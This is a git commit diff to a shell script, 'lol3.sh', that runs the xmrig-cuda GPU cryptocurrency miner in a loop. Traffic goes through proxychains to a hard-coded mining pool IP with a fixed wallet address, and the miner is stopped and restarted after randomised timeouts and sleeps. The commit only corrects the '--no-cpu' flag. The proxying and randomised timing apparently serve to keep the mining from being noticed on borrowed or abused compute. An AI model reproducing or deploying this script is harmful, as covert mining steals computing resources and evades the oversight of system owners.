eb8e697113ea550ec8d0f93efb73b288c88f9556
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2021-01-13 17:09:20 +0530

    Update lol3.sh

--- lol3.sh
+++ lol3.sh
@@ -12,7 +12,7 @@ do
 	w=$(($RANDOM%100))
 	e=120
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s  proxychains ./xmrig-cuda/build/xmrig --donate-level 0 -o 54.189.231.81:13802 -u  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc  -a kawpow --cuda --tls  -no-cpu -p pps --retries=5000
+	timeout -k 5 $c\s  proxychains ./xmrig-cuda/build/xmrig --donate-level 0 -o 54.189.231.81:13802 -u  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc  -a kawpow --cuda --tls  --no-cpu -p pps --retries=5000
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
 done
